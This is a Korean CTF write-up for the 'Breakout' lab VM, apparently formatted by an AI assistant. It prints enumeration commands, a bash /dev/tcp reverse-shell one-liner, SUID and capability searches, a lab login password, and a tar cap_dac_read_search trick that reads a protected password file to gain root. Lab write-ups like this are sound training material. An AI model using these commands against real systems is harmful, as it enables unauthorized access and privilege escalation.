아, 구조를 다시 이해했어요. **개념/명령어 설명 블록** + **이미지 한번에** + **실행 순서 번호 태그** 이렇게 가는 거죠?

---

# 🚩 CTF Writeup — Breakout

> **공격자:** Kali Linux | **타겟:** Breakout OVA (`172.16.11.216`)

---

## 🧰 사용 도구 & 개념 정리

### 🔹 enum4linux
SMB/NetBIOS 프로토콜을 통해 타겟 시스템의 **유저 목록, 공유 폴더, OS 정보** 등을 열거하는 도구.
```bash
sudo enum4linux 172.16.11.216
```
→ `User\cyber` 확인 → 유저명: **cyber**

---

### 🔹 Reverse Shell (리버스 셸)
타겟이 공격자에게 먼저 연결해오는 방식. 방화벽 우회에 효과적.
```bash
# 공격자 (Kali) - 리스너 대기
nc -lvp 1234

# 타겟 서버에서 실행
bash -i >& /dev/tcp/172.16.11.213/1234 0>&1
```

---

### 🔹 SUID 탐색
SUID 비트가 설정된 파일은 **소유자(root) 권한으로 실행**됨.
```bash
find / -perm -4000 -type f 2>/dev/null
```

---

### 🔹 getcap (핵심 권한 상승 벡터)
리눅스 파일에 부여된 **Capabilities(세분화된 권한)** 를 확인하는 명령어.
SUID 없이도 특정 작업만 root처럼 수행 가능한 파일을 찾아낼 수 있어, **보안 설정이 허술한 파일을 발견하는 핵심 도구**.
```bash
getcap -r / 2>/dev/null
```
→ `tar`에 `cap_dac_read_search` 등 과도한 권한 발견

---

### 🔹 tar Capability 악용
`tar`에 파일 읽기 capability가 있으면, **원래 접근 불가한 파일도 압축 가능**.
```bash
ls -al

# 읽기 불가 파일을 tar로 훔치기
./tar cf bak.tar /var/backups/.old_pass.bak

# 압축 해제
tar -xf bak.tar

# 패스워드 확인
cat var/backups/.old_pass.bak
```

---

### 🔹 root 권한 획득 & 플래그
```bash
su root               # 획득한 패스워드로 root 전환
cd /root
ls
cat rOOt.txt          # 🎉 플래그 획득
```

---

## 📸 실행 화면

<img width="678" height="443" alt="Image" src="https://github.com/user-attachments/assets/51e9013a-d413-4b08-bbf9-1346d183f4e2" />
<img width="683" height="582" alt="Image" src="https://github.com/user-attachments/assets/633a147e-cbdb-46f6-88ef-88de44f4ca06" />

<img width="677" height="237" alt="Image" src="https://github.com/user-attachments/assets/bde1fab0-3339-43d2-a123-f2a9dbfdae3e" />
<img width="853" height="876" alt="Image" src="https://github.com/user-attachments/assets/f0b1873b-4f6b-4d4d-8d08-7aa8a622f6d8" />

<img width="677" height="585" alt="Image" src="https://github.com/user-attachments/assets/b0ba1527-ee4f-4f8a-a72d-e008744692bd" />
<img width="850" height="952" alt="Image" src="https://github.com/user-attachments/assets/c3cb34f4-7a0c-41f7-b280-923c9b5b4993" />

<img width="832" height="972" alt="Image" src="https://github.com/user-attachments/assets/19da6a61-a6ca-4848-9464-41e96eee4541" />
<img width="862" height="977" alt="Image" src="https://github.com/user-attachments/assets/4dfde00a-2175-4d2e-90f2-93fbc9764caa" />

<img width="859" height="968" alt="Image" src="https://github.com/user-attachments/assets/acac8a2f-c257-4a9b-8024-0fbb08817c5b" />
<img width="846" height="970" alt="Image" src="https://github.com/user-attachments/assets/f9a73b6b-ec5a-4986-a912-a30b7e4de4d1" />


<img width="666" height="71" alt="Image" src="https://github.com/user-attachments/assets/e3747f19-840c-47c0-b2ad-803fc6bd1827" />
<img width="658" height="528" alt="Image" src="https://github.com/user-attachments/assets/74373f53-7386-4766-9822-d8209f9ac359" />
<img width="892" height="795" alt="Image" src="https://github.com/user-attachments/assets/de34ccdd-c187-4437-a66a-4dc83736dd73" />

---

## 🔑 공격 흐름 요약

| 단계 | 기술 | 명령어 |
|:---:|------|--------|
| `1` | SMB 열거 | `enum4linux 172.16.11.216` |
| `2` | 계정 로그인 | cyber / `.2uqPEfj3D<P'a-3` |
| `3` | 시스템 정보 | `cat /etc/issue` · `uname -a` |
| `4` | 리버스 셸 | `bash -i >& /dev/tcp/IP/1234 0>&1` |
| `5` | SUID 탐색 | `find / -perm -4000 -type f` |
| `6` | Capability 탐색 | `getcap -r /` |
| `7~9` | tar 악용 → 파일 탈취 | `./tar cf bak.tar` · `tar -xf` |
| `10` | root 전환 | `su root` |
| `11` | 플래그 획득 | `cat rOOt.txt` |

---

> ⚠️ 본 문서는 CTF 학습 목적으로 작성된 실습 기록입니다.
